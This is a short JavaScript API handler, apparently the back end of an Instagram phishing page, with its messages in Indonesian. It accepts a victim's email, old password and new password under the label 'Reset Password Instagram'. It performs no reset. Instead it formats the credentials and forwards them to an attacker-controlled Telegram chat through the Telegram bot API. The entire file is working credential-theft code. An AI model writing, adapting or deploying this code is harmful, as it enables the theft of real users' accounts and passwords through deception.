export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Metode tidak diizinkan' });
  }

  const { email, oldPass, newPass } = req.body;

  if (!email || !oldPass || !newPass) {
    return res.status(400).json({ message: 'Data tidak lengkap' });
  }

  const botToken = process.env.BOT_TOKEN;
  const chatId = process.env.CHAT_ID;

  if (!botToken || !chatId) {
    return res.status(500).json({ message: 'Konfigurasi tidak tersedia' });
  }

  const text = `
🔐 Reset Password Instagram
━━━━━━━━━━━━━━━━━━
📧 Email: ${email}
🔑 Password Lama: ${oldPass}
🆕 Password Baru: ${newPass}
━━━━━━━━━━━━━━━━━━
🕒 ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
`;

  try {
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

    const send = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text
      }),
    });

    const responseText = await send.text();

    if (!send.ok) {
      console.error('Telegram error:', send.status, responseText);
      return res.status(500).json({ message: 'Gagal mengirim ke Telegram', detail: responseText });
    }

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Telegram error:', error);
    return res.status(500).json({ message: 'Gagal mengirim ke Telegram', error: error.message });
  }
}
